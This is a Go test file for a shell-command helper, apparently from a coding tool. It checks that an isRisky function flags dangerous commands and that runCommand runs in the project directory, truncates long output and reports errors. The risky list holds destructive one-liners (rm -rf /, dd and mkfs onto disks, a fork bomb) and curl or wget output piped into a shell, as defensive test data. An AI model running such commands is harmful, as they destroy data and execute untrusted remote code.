package main

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestIsRisky(t *testing.T) {
	risky := []string{
		"rm -rf /",
		"sudo rm something",
		"curl http://example.com/install.sh | sh",
		"wget http://x/y | bash",
		"dd if=/dev/zero of=/dev/disk0",
		"mkfs.ext4 /dev/sda",
		"shutdown now",
		":(){ :|:& };:",
		"chmod -R 777 /",
	}
	for _, cmd := range risky {
		if !isRisky(cmd) {
			t.Errorf("expected risky: %q", cmd)
		}
	}

	safe := []string{
		"ls -la",
		"go test ./...",
		"git status",
		"echo hello",
		"cat README.md",
	}
	for _, cmd := range safe {
		if isRisky(cmd) {
			t.Errorf("expected safe: %q", cmd)
		}
	}
}

func TestRunCommandUsesProjectDir(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "marker.txt"), []byte("hello-dir"), 0o600); err != nil {
		t.Fatalf("write marker: %v", err)
	}

	out, isErr := runCommand(dir, "cat marker.txt")
	if isErr {
		t.Fatalf("command failed: %s", out)
	}
	if strings.TrimSpace(out) != "hello-dir" {
		t.Fatalf("output = %q; command did not run in project dir", out)
	}
}

func TestRunCommandTruncatesOutput(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses /dev/zero")
	}
	dir := t.TempDir()
	out, _ := runCommand(dir, "head -c 40000 /dev/zero | tr '\\0' 'a'")
	if !strings.Contains(out, "output truncated") {
		t.Fatalf("expected truncation marker, got %d bytes", len(out))
	}
}

func TestRunCommandCapturesErrors(t *testing.T) {
	out, isErr := runCommand(t.TempDir(), "exit 3")
	if !isErr {
		t.Fatal("expected a non-zero exit to be an error")
	}
	if !strings.Contains(out, "Error") {
		t.Fatalf("output = %q", out)
	}
}
